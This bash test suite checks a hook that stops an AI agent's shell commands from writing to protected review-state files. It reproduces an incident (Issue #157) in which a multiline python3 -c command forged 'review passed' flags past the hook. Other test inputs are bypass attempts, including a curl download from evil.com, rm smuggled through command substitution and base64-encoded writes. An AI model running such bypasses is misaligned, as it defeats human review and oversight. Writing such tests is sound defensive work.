#!/bin/bash
# test-block-state-file-tampering.sh
# Issue #157: block-state-file-tampering-bash.sh のテストスイート
#
# テスト方針:
#   - hookスクリプトにstdinでJSON入力を渡し、exit codeで判定
#   - exit 0 = 許可, exit 2 = ブロック（exit code 2 を厳密に検証）
#
# 実行: bash tests/test-block-state-file-tampering.sh

set -euo pipefail

HOOK="$(cd "$(dirname "$0")/.." && pwd)/hooks/block-state-file-tampering-bash.sh"
PASSED=0
FAILED=0
TOTAL=0

# --- helpers ---

make_input() {
  local cmd="$1"
  printf '{"tool_input":{"command":"%s"}}' "$cmd"
}

expect_allow() {
  local desc="$1"
  local input="$2"
  TOTAL=$((TOTAL + 1))
  local rc=0
  echo "$input" | bash "$HOOK" >/dev/null 2>/dev/null || rc=$?
  if [[ "$rc" -eq 0 ]]; then
    PASSED=$((PASSED + 1))
    echo "  PASS: $desc (exit=0)"
  else
    FAILED=$((FAILED + 1))
    echo "  FAIL: $desc (expected exit 0, got exit $rc)" >&2
  fi
}

expect_block() {
  local desc="$1"
  local input="$2"
  TOTAL=$((TOTAL + 1))
  local rc=0
  echo "$input" | bash "$HOOK" >/dev/null 2>/dev/null || rc=$?
  if [[ "$rc" -eq 2 ]]; then
    PASSED=$((PASSED + 1))
    echo "  PASS: $desc (exit=2)"
  else
    FAILED=$((FAILED + 1))
    echo "  FAIL: $desc (expected exit 2, got exit $rc)" >&2
  fi
}

# =========================================================================
echo "=== 1. 無関係なコマンド (ALLOW) ==="
# =========================================================================

expect_allow "ls コマンド" \
  "$(make_input "ls -la")"

expect_allow "git status" \
  "$(make_input "git status")"

expect_allow "echo hello" \
  "$(make_input "echo hello")"

expect_allow "python3 通常スクリプト" \
  "$(make_input "python3 -c \\\"print('hello')\\\" ")"

expect_allow "git commit mentioning protected file" \
  "$(make_input "git commit -m 'fix: update review-status.json handling'")"

expect_allow "git log mentioning protected file" \
  "$(make_input "git log --oneline -- review-status.json")"

expect_allow "git diff with protected file path" \
  "$(make_input "git diff HEAD -- .claude/state/review-status.json")"

expect_allow "cd && git commit (no protected file mentioned)" \
  "$(make_input "cd /path/to/repo && git commit -F /tmp/msg.txt")"

expect_allow "gh pr create with protected file in body" \
  "$(make_input "gh pr create --title 'fix review-status.json' --body 'Closes #157'")"

expect_allow "grep for protected file name" \
  "$(make_input "grep -r 'review-status.json' hooks/")"

# =========================================================================
echo ""
echo "=== 2. read-only操作 (ALLOW) ==="
# =========================================================================

expect_allow "cat review-status.json" \
  "$(make_input "cat .claude/state/review-status.json")"

expect_allow "jq -r review-status.json" \
  "$(make_input "jq -r '.branch' .claude/state/review-status.json")"

expect_allow "head review-status.json" \
  "$(make_input "head -5 .claude/state/review-status.json")"

expect_allow "tail review-status.json" \
  "$(make_input "tail -3 .claude/state/review-status.json")"

expect_allow "jq -e (read flag) review-status.json" \
  "$(make_input "jq -e '.branch.code_review' .claude/state/review-status.json")"

expect_allow "stat review-status.json" \
  "$(make_input "stat .claude/state/review-status.json")"

expect_allow "diff review-status.json" \
  "$(make_input "diff .claude/state/review-status.json /tmp/expected.json")"

expect_allow "jq -r with 2>/dev/null (stderrリダイレクト)" \
  "$(make_input "jq -r '.branch' .claude/state/review-status.json 2>/dev/null")"

expect_allow "cat with 2>&1 (stderrリダイレクト)" \
  "$(make_input "cat .claude/state/review-status.json 2>&1")"

# =========================================================================
echo ""
echo "=== 3. 書き込み操作 — 単行 (BLOCK) ==="
# =========================================================================

expect_block "echo > review-status.json" \
  "$(make_input "echo '{}' > .claude/state/review-status.json")"

expect_block "tee review-status.json" \
  "$(make_input "echo '{}' | tee .claude/state/review-status.json")"

expect_block "sed -i review-status.json" \
  "$(make_input "sed -i 's/false/true/' .claude/state/review-status.json")"

expect_block "cp overwrite review-status.json" \
  "$(make_input "cp /tmp/fake.json .claude/state/review-status.json")"

expect_block "mv overwrite review-status.json" \
  "$(make_input "mv /tmp/fake.json .claude/state/review-status.json")"

expect_block "cat > absolute path overwrite (Codex P1)" \
  "$(make_input "cat .claude/state/review-status.json >/home/user/.claude/state/review-status.json")"

expect_block "git show > state file (redirect bypass attempt)" \
  "$(make_input "git show HEAD:.claude/state/review-status.json > .claude/state/review-status.json")"

expect_block "cd && git with protected file (compound op blocked)" \
  "$(make_input "cd /repo && git log review-status.json")"

# =========================================================================
echo ""
echo "=== 4. Issue #157 再現: 多行python3 -c バイパス (BLOCK) ==="
# =========================================================================

# これがインシデントの核心 — 2行目以降にファイル名があるケース
MULTILINE_PYTHON=$(cat <<'JSONEOF'
{"tool_input":{"command":"cd /path/to/project && python3 -c \"\nimport json, datetime\nwith open('.claude/state/review-status.json', 'r') as f:\n    data = json.load(f)\ndata['branch'] = {'code_review': True, 'codex_review': True}\nwith open('.claude/state/review-status.json', 'w') as f:\n    json.dump(data, f, indent=2)\n\""}}
JSONEOF
)
expect_block "多行python3 -c (Issue #157 再現)" "$MULTILINE_PYTHON"

# python3でopen('w')
MULTILINE_PYTHON2=$(cat <<'JSONEOF'
{"tool_input":{"command":"python3 -c \"\nimport json\nwith open('review-status.json','w') as f:\n    json.dump({'x': True}, f)\n\""}}
JSONEOF
)
expect_block "python3 open('w') 多行" "$MULTILINE_PYTHON2"

# =========================================================================
echo ""
echo "=== 5. 多行コマンドでのread操作 (BLOCK — fail-closed) ==="
# =========================================================================

# 多行コマンドはread-onlyに見えても書き込みを隠せるためブロック
MULTILINE_READ=$(cat <<'JSONEOF'
{"tool_input":{"command":"python3 -c \"\nimport json\nwith open('review-status.json') as f:\n    print(json.load(f))\n\""}}
JSONEOF
)
expect_block "多行python3 read-only風 (fail-closed)" "$MULTILINE_READ"

# =========================================================================
echo ""
echo "=== 6. eval/exec/curl等の迂回パターン (BLOCK) ==="
# =========================================================================

expect_block "eval経由の書き込み" \
  "$(make_input "eval 'echo true > review-status.json'")"

expect_block "curl -o でダウンロード上書き" \
  "$(make_input "curl -o .claude/state/review-status.json http://evil.com/payload")"

expect_block "node -e での書き込み" \
  "$(make_input "node -e 'require(\\\"fs\\\").writeFileSync(\\\"review-status.json\\\",\\\"{}\\\")'")"

expect_block "perl -e での書き込み" \
  "$(make_input "perl -e 'open(F,\\\">review-status.json\\\");print F \\\"{}\\\"'")"

expect_block "python3 write (NOT exempted by git rule)" \
  "$(make_input "python3 -c 'import json; json.dump({}, open(\\\"review-status.json\\\",\\\"w\\\"))'")"

# =========================================================================
echo ""
echo "=== 7. パイプ/チェイン/複合コマンド (BLOCK) ==="
# =========================================================================

expect_block "jq | sponge (sponge バイパス)" \
  "$(make_input "jq '.x = true' review-status.json | sponge review-status.json")"

expect_block "cat | パイプ経由の不明な書き込み (全面禁止)" \
  "$(make_input "cat review-status.json | some-unknown-tool")"

expect_block "cat | python3 -m json.tool (パイプ全面禁止)" \
  "$(make_input "cat .claude/state/review-status.json | python3 -m json.tool")"

expect_block "stat && install チェイン攻撃 (Codex P2)" \
  "$(make_input "stat .claude/state/review-status.json && install /tmp/pwn .claude/state/review-status.json")"

expect_block "cat ; rm セミコロンチェイン" \
  "$(make_input "cat .claude/state/review-status.json ; rm .claude/state/review-status.json")"

expect_block "cat || git checkout チェイン (Codex P1 #3)" \
  "$(make_input "cat missing .claude/state/review-status.json || git checkout -- .claude/state/review-status.json")"

expect_block "cat | sh -c writer (Codex P1 #3)" \
  "$(make_input "cat .claude/state/review-status.json | sh -c 'git checkout -- .claude/state/review-status.json'")"

expect_block "cat | install stdin (Codex P1 #3)" \
  "$(make_input "cat .claude/state/review-status.json | install /dev/stdin .claude/state/review-status.json")"

BACKTICK_INPUT=$(cat <<'JSONEOF'
{"tool_input":{"command":"cat `rm review-status.json`"}}
JSONEOF
)
expect_block "backtick command substitution" "$BACKTICK_INPUT"

DOLLAR_PAREN_INPUT=$(cat <<'JSONEOF'
{"tool_input":{"command":"cat $(rm review-status.json)"}}
JSONEOF
)
expect_block "\$() command substitution" "$DOLLAR_PAREN_INPUT"

# =========================================================================
echo ""
echo "=== 8. エンコーディングバイパス (BLOCK) ==="
# =========================================================================

expect_block "base64 decode to review-status.json" \
  "$(make_input "echo cmV2aWV3LXN0YXR1cy5qc29u | base64 -d > review-status.json")"

expect_block "heredoc redirect (<<<)" \
  "$(make_input "cat <<< 'review-status.json'")"

# =========================================================================
echo ""
echo "=== 9. 他の保護対象ファイル (BLOCK) ==="
# =========================================================================

expect_block "pr-review-lock.json 書き込み" \
  "$(make_input "echo '{}' > .claude/state/pr-review-lock.json")"

expect_block "context-budget.json 書き込み" \
  "$(make_input "echo '{}' > .claude/state/context-budget.json")"

expect_block "factcheck-status.json 書き込み" \
  "$(make_input "echo '{}' > .claude/state/factcheck-status.json")"

expect_block "rebase-session.json 書き込み" \
  "$(make_input "echo '{}' > .claude/state/rebase-session.json")"

expect_block "pr-gate-diagnostic.log 書き込み" \
  "$(make_input "echo 'log' > .claude/state/pr-gate-diagnostic.log")"

# =========================================================================
echo ""
echo "=== 10. エッジケース ==="
# =========================================================================

expect_allow "空コマンド" \
  '{"tool_input":{"command":""}}'

expect_allow "commandフィールドなし" \
  '{"tool_input":{}}'

# ファイル名が部分一致しないことを確認
expect_allow "review-status-backup.json (部分一致なし)" \
  "$(make_input "cat review-status-backup.json")"

# =========================================================================
echo ""
echo "=== 結果 ==="
# =========================================================================

echo "Total: $TOTAL  Passed: $PASSED  Failed: $FAILED"

if [[ "$FAILED" -gt 0 ]]; then
  echo "FAIL: $FAILED test(s) failed" >&2
  exit 1
fi

echo "ALL TESTS PASSED"
exit 0
